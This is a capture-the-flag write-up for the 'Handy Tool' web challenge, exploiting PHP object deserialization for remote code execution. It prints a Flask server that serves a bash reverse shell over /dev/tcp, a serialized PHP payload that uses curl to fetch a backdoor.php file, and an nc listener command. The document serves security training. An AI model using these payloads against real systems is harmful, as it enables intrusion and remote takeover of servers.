# Name: Web: Exotic Attacks: Handy Tool

## Vulnerability

LFI + PHP Object Injection / PHP Insecure Object Deserialization + RCE

## Exploit

The exploit involves opening a reverse shell. You'll need to:

1. Create an account on [ngrok](https://ngrok.com/) (also confirm your email address).
2. Install `ngrok` on you machine.
3. Forward your 1234 port using: `ngrok tcp 1234`. A ngrok host and IP will be forwarded to your local port.

The instructions are also available [here](https://securiumsolutions.com/blog/reverse-shell-using-tcp/). Don't close the `ngrok` terminal until we are done.

Now coming back to the challenge.
First, use the **Guess my last name** option.
As in the Romanian cartoon, the correct answer is **Iscusitul**.
After you input it, the server echoes `backup.zip`.

This is the name of an archive left in the server containing a relevant piece of source code.
Access it at `/backup.zip` and decompress it.

The other tools in the web page really do what they say: uppercase the input, unserialize it or trim the whitespace.
You guessed it, the handy one is **Unserialize**.

After inspecting the source code in the archive, you see what the serialized input object should look like.
It has to be a PHP class with two attributes:

* `$condition` - boolean with the value `true`
* `$prop` - a string you can use for remote code execution on the server

Since the actual output of the command is not shown, only the unserialized string, you should try to create a reverse shell.

I started a Flask app on my internal port where, if accessed, I return a piece of PHP code that spawns a reverse shell to my machine.
Make sure to update the ngrok host and port.
You can run the server with: `python app.py`:

```python
from flask import Flask, make_response

app = Flask(__name__)

NGROK_HOST = ""  # TODO: ngrok host
NGROK_PORT = 0 # TODO: ngrok port
INTERNAL_PORT = 1234

@app.route("/", methods=['GET'])
def index():
    code = '''<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1'");''' % (NGROK_HOST, NGROK_PORT)

    return make_response(code)


if __name__ == "__main__":
    app.run(host="0.0.0.0", debug=True, port=INTERNAL_PORT)
```

I created a PHP class with a command that performs a request to my server and saves the output to `backdoor.php`.
I created the serialized input.
Make sure to update the ngrok host and port.

```php
<?php
    $NGROK_HOST = ""; // TODO: ngrok host
    $NGROK_PORT = 0; // TODO: ngrok port

    class PHPClass
    {
        public $condition = true;
        public $prop = "system('curl http://".$NGROK_HOST.":".$NGROK_PORT" -o backdoor.php');";
    }

    echo urlencode(serialize(new PHPClass));
?>
```

You can run this file in command line with: `php payload.php`.
The serialized payload is:

`O:8:"PHPClass":2:{s:9:"condition";b:1;s:4:"prop";s:54:"system('curl http://<ngrok host>:<ngrok port> -o backdoor.php');";}`

After you input it on the server, the file `/backdoor.php` is created and you can access it.

In the meantime, the Flask server on your machine won't support this reverse shell.
You need to close it and open a simple netcat connection to your internal port before you access the backdoor:

`nc -nlvk 1234`

Now access `/backdoor.php` in the browser and you should have a shell in the `nc` terminal.

Find the flag file and perform a `cat` on it; it should be in `home/ctf/`: `cat /home/ctf/flag.txt`.

Exploit in `../solution/solution.sh`.
